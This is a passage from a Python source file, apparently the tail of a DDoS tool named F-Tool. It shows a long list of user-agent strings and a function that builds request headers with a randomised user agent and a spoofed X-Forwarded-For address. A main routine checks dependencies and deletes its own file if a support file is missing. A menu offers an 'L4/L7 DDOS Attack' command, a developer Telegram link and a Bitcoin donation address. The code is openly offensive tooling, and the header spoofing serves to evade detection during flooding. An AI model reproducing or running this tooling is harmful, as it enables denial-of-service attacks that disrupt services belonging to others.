	'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.13) Gecko/20101213 Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01',
	'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0',
			'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
			'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
			'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
			'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
			'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1',
			'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
			'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
			'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
			'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
			'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
			'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2',
			'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0',
			'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0',
			'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
			'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
			'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
			'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
			'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
			'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
			'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
			'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
			'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
			'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
			'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
			'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
			'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
			'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
			'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
			'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
			'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
			'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
			'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
			'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
			'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
			'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
			'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
			'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
			'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
			'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
			'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
			'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.5',
			'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
			'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
			'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
			'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
			'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
			'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
			'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
			'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
			'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
			'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
			'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
			'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
			'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
			'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
			'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
			'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
			'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
			'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
			'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
			'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
			'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
			'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
			'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
			'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
			'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
			'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
			'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
			'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
			'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
			'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
			'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
			'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
			'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
			'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
			'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
			'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
			'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
			'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
			'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
			'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
			'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
			'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
			'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
			'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
			'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',]

	return {
	'Connection': 'Keep-Alive',
	'Cache-control': 'no-cache',
	'User-Agent': random.choice(useragents).strip(),
	'X-Forwarded-For': random.choice(spoof_ip)
	}

def main():
	#  checking if you're gay 😏
	F_Tool.styleText("[+] Checking Dependencies...\n\n")
	pkgs = ['screen', 'node']
	install = True
	for pkg in pkgs:
		ur_mom = which(pkg)
		if ur_mom == None:
			F_Tool.styleText(f"[!] {pkg} is not installed!\n")
			install = False
		else:
			pass
	if install == False:
		sys.exit(f'\n[?] Error? try:{Color.LG} sh install.sh')
	else:pass
	try:
		script = True
		with open('utils') as important:pass
	except IsADirectoryError:pass
	except FileNotFoundError:
		print(f"{Color.LR}[CRITICAL ERROR]:{Color.RESET} File: 'utils' NotFound")
		print("\n[+] Please download on GitHub, or git clone: https://github.com/FDc0d3/F-Tool.git\n")
		os.remove(f'{__file__}')
		script = False
	if script == False:sys.exit()
	else:F_Tool.home()


if __name__ == '__main__':
	commands = f"""{Color.LC}HOME{Color.LR} ~>{Color.LY}Back to home
{Color.LC}REF{Color.LR} ~> {Color.LY}Refresh the menu
{Color.LC}CLEAR{Color.LR} ~> {Color.LY}Clear your face xd
{Color.LC}EXIT{Color.LR} ~> {Color.LY}Exit the program
{Color.LC}BBOS{Color.LR} ~> {Color.LY}L4/L7 DDOS Attack
{Color.LC}STOP{Color.LR} ~> {Color.LY}Stop your Attack
{Color.LC}DEV{Color.LR} ~> {Color.LY}Contact/Support dev"""
	dev = f"""{Color.LC}Telegram{Color.LR}: {Color.LY}https://t.me/FDc0d3
{Color.LC}New[BTC]Address{Color.LR}: {Color.LY}32FGCnt4uwkkByWuH8V4qyCSfynm1iVsmB"""
	F_Tool = Home(commands, dev)
	Tool = Tool(commands, dev, spoof_useragents())
	try:open('F-Tool.py');main()
	except:quit()
